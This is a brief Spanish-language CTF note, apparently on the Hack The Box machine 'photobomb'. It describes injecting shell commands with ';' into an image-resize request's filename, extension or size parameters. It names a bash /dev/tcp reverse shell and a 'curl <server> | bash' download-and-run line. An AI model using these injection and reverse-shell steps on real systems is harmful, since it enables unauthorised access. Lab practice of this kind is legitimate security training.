	####Image hacking
maquina: photobomb en HTB
	###Command injection
#El reescalado de una imagen en linux puede hacerse con
convert nombre -resize proporciones nombre
#Se podria intentar ejecutar comandos si a la peticion se le adjunta uno con ; en diferentes partes de la misma como en el nombre, la extension o el escalado (cambiando los parametros de la peticion que se esta haciendo, no header).
En este punto se podrian inyectar comandos para poder recibir una shell.
Compartiendo mediante un server http nuestra reverse shell (bash -i >& /dev/tcp....) se podria inyectar un curl <ip server http> | bash para obtener una shell
Tambien se podria descarar y ejecutarlo de forma local en la maquina que estamos atacando



